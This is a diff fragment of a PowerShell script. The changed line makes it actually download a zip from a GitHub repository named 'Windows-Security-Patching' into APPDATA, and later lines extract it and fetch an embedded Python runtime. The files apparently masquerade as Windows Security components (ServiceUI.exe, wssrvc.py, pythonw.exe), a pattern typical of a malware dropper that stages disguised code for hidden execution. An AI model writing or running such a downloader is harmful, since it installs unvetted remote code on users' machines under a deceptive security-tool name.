@@ -13,7 +13,7 @@ $winsecUI = Join-Path $AppDataPath $FolderName "WindowsSecurityUI"
 $serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
 $wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
 $pythonwExePath = Join-Path $winsecUI "pythonw.exe"
-https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $env:APPDATA\WindowsSecurityUI.zip
+wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $env:APPDATA\WindowsSecurityUI.zip
 Expand-Archive -Path $env:APPDATA\WindowsSecurityUI.zip -DestinationPath $env:APPDATA\$FolderName
 wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurityUI\
